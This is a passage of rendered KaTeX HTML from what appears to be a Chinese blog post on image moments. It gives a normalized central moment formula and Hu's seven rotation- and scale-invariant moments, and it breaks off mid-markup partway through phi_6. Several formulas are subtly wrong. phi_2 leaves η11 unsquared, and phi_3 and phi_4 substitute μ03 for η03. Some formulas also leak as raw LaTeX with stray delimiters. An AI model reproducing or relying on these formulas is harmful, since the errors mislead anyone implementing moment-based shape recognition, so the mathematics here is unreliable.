class="base"><span class="strut" style="height:2.464803em;vertical-align:-1.357243em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.200935em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2009349999999999em;"><span style="top:-2.733692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.5856000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.87905em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">p</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.430935em;"><span class="pstrut" style="height:3.200935em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.877935em;"><span class="pstrut" style="height:3.200935em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">p</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.357243em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><ul><li>Hu距7个值性质：旋转不变形，伸缩不变性</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>ϕ</mi><mn>1</mn></msub><mo>=</mo><msub><mi>η</mi><mn>20</mn></msub><mo>+</mo><msub><mi>η</mi><mn>02</mn></msub></mrow><annotation encoding="application/x-tex">\phi_1 = \eta_{20}+ \eta_{02}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">ϕ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>phi_2 = (\eta_{20}- \eta_{02})^2+4\eta_{11}$$$phi_3 = (\eta_{30}- 3\eta_{12})^2+(3\eta_{21}- \mu_{03})^2<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>h</mi><msub><mi>i</mi><mn>4</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>30</mn></msub><mo>+</mo><msub><mi>η</mi><mn>12</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>21</mn></msub><mo>+</mo><msub><mi>μ</mi><mn>03</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">phi_4 = (\eta_{30}+\eta_{12})^2+(\eta_{21}+ \mu_{03})^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>h</mi><msub><mi>i</mi><mn>5</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>30</mn></msub><mo>−</mo><mn>3</mn><msub><mi>η</mi><mn>12</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>30</mn></msub><mo>+</mo><msub><mi>η</mi><mn>12</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">[</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>30</mn></msub><mo>+</mo><msub><mi>η</mi><mn>12</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>−</mo><mn>3</mn><mo stretchy="false">(</mo><msub><mi>η</mi><mn>21</mn></msub><mo>−</mo><mn>3</mn><msub><mi>η</mi><mn>03</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">]</mo><mo>+</mo><mo stretchy="false">(</mo><mn>3</mn><msub><mi>η</mi><mn>21</mn></msub><mo>−</mo><msub><mi>η</mi><mn>03</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>21</mn></msub><mo>+</mo><msub><mi>η</mi><mn>03</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">(</mo><msub><mi>η</mi><mn>30</mn></msub><mo>+</mo><msub><mi>η</mi><mn>12</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>−</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>21</mn></msub><mo>+</mo><msub><mi>η</mi><mn>03</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">phi_5 = (\eta_{30}-3\eta_{12})(\eta_{30}+\eta_{12})[(\eta_{30}+\eta_{12})^2-3(\eta_{21}-3\eta_{03})^2]  +(3\eta_{21}-\eta_{03})(\eta_{21}+\eta_{03})[3(\eta_{30}+\eta_{12})^2-(\eta_{21}+\eta_{03})^2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">[</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">[</span><span class="mord">3</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>h</mi><msub><mi>i</mi><mn>6</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>20</mn></msub><mo>−</mo><msub><mi>η</mi><mn>02</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">[</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>30</mn></msub><mo>+</mo><msub><mi>η</mi><mn>12</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>−</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>21</mn></msub><mo>+</mo><msub><mi>η</mi><mn>03</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">]</mo><mo>+</mo><mn>4</mn><msub><mi>η</mi><mn>11</mn></msub><mo stretchy="false">(</mo><msub><mi>η</mi><mn>30</mn></msub><mo>+</mo><msub><mi>η</mi><mn>12</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>21</mn></msub><mo>+</mo><msub><mi>η</mi><mn>03</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">phi_6 = (\eta_{20}-\eta_{02})[(\eta_{30}+\eta_{12})^2-(\eta_{21}+\eta_{03})^2] +4\eta_{11}(\eta_{30}+\eta_{12})(\eta_{21}+\eta_{03})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span 